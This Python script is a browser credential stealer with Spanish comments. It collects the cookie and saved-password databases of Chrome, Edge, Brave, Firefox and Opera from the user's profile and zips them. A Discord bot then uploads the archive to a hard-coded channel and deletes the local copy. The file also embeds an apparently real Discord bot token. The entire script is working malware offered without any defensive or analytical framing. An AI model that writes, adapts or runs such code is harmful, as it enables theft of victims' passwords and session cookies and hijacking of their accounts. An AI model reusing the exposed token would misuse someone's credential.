import os
import sqlite3
import zipfile
import shutil
import json
import discord
from discord.ext import commands

TOKEN = "MTMxMDk4NDgxNjA0MDIxNDU4OQ.GOvKp2.20cJ3Kkm1dg0tiNTvfsHX9c4v-HdHPCepCZHIQ"
GUILD_ID = 870347825937018882
CHANNEL_ID = 1310986733093130261

# Función para detectar navegadores y sus rutas de cookies y contraseñas
def get_browser_data_paths():
    user_path = os.getenv("USERPROFILE")
    paths = {
        "chrome_cookies": os.path.join(user_path, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
        "chrome_login_data": os.path.join(user_path, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
        "edge_cookies": os.path.join(user_path, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
        "edge_login_data": os.path.join(user_path, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
        "brave_cookies": os.path.join(user_path, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies"),
        "brave_login_data": os.path.join(user_path, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
        "firefox_cookies": os.path.join(user_path, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
        "firefox_logins": os.path.join(user_path, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
        "opera_cookies": os.path.join(user_path, "AppData", "Roaming", "Opera Software", "Opera Stable", "Cookies"),
    }

    detected_paths = {name: path for name, path in paths.items() if os.path.exists(path)}
    return detected_paths

# Función para copiar los archivos directamente a un ZIP
def create_zip_file(data_paths, zip_name="cookies_and_passwords.zip"):
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        for name, path in data_paths.items():
            if name == "firefox_cookies" or name == "firefox_logins":
                # Firefox requiere detección de perfiles
                profile_dirs = [d for d in os.listdir(path) if os.path.isdir(os.path.join(path, d))]
                if profile_dirs:
                    # Copiar cookies.sqlite y logins.json
                    path_cookies = os.path.join(path, profile_dirs[0], "cookies.sqlite")
                    path_logins = os.path.join(path, profile_dirs[0], "logins.json")
                    if os.path.exists(path_cookies):
                        zipf.write(path_cookies, "firefox_cookies.sqlite")
                    if os.path.exists(path_logins):
                        zipf.write(path_logins, "firefox_logins.json")
            else:
                # Copiar cookies tal como están y renombrar Login Data como .sqlite
                if os.path.exists(path):
                    if 'login' in name.lower():
                        # Si el archivo es de login, renombramos a .sqlite
                        zipf.write(path, f"{name}.sqlite")
                    else:
                        # Copiar cookies tal cual
                        zipf.write(path, f"{name}")
    print(f"Archivo ZIP creado: {zip_name}")
    return zip_name

# Configuración del bot de Discord
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"{bot.user.name} está conectado a Discord.")

    # Detectar los navegadores y crear el archivo ZIP con cookies y contraseñas
    data_paths = get_browser_data_paths()
    if not data_paths:
        print("No se detectaron navegadores con cookies o contraseñas almacenadas.")
        return

    # Crear archivo ZIP
    zip_path = create_zip_file(data_paths)

    # Acceder al canal
    guild = discord.utils.get(bot.guilds, id=GUILD_ID)
    if guild:
        channel = guild.get_channel(CHANNEL_ID)
        if channel:
            if os.path.exists(zip_path):
                # Enviar el archivo ZIP al canal
                await channel.send(
                    "Aquí está el archivo .zip con las cookies y contraseñas:",
                    file=discord.File(zip_path)
                )
                print("Archivo enviado con éxito.")
                # Eliminar el archivo ZIP después de enviarlo
                os.remove(zip_path)
                print("Archivo ZIP eliminado después del envío.")
            else:
                print("El archivo ZIP no existe.")
    await bot.close()

# Iniciar el bot
bot.run(TOKEN)